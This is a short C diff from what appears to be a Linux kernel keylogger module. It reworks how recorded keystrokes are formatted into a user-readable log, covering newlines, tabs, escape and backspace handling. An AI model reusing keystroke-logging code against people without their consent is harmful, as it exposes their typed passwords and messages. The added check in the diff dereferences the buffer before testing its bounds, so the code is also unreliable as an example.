@@ -6,8 +6,9 @@ int	delete = 0;
 
 int		printable_char(unsigned char key)
 {
-	if (key == 28 || key == 14 || key == 58 || key == 122 || key == 42 || key == 29 || key == 56 || key == 15 \
-		|| key == 92 || key == 96 || key == 75 || key == 72 || key == 80 || key == 77 || key == 54)
+	if (key == 28 || key == 14 || key == 58 || key == 122 || key == 42 || key == 29 || key == 56 || \
+		key == 15 || key == 92 || key == 96 || key == 75 || key == 72 || key == 80 || key == 77 || \
+		key == 54 || key == 1)
 		return 1;
 	return 0;
 }
@@ -24,22 +25,24 @@ void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t
 		       	node->name, node->key, node->state ? "Released" : "Pressed", RESET);
 	else
 	{
-		if (!node->state && !printable_char(node->key))
-			sprintf(message, "%s",node->name);
-		else if (!node->state && node->key == 28)
-			sprintf(message, "\n");
-		else if (!node->state && node->key == 15)
-			sprintf(message, "\t");
-		else if (!node->state && node->key == 14)
+		if (!node->state)
 		{
-	//		sprintf(message, "");
-			delete++;
+			if (!printable_char(node->key))
+				sprintf(message, "%s",node->name);
+			else if (node->key == 28)
+				sprintf(message, "\n");
+			else if (node->key == 15)
+				sprintf(message, "\t");
+			else if (node->key == 14)
+				delete++;
 		}
 	}
 	msg_len = strlen(message);
 	if (len > msg_len)
 	{
-		if (delete)
+		if (*(buffer + **offset - delete) == '\n' || buffer + **offset - delete < buffer)
+			delete--;
+		else if (delete)
 			*(buffer + **offset - delete) = '\0';
 		if (!copy_to_user(buffer + **offset - delete, message, msg_len))
 			**offset += msg_len;
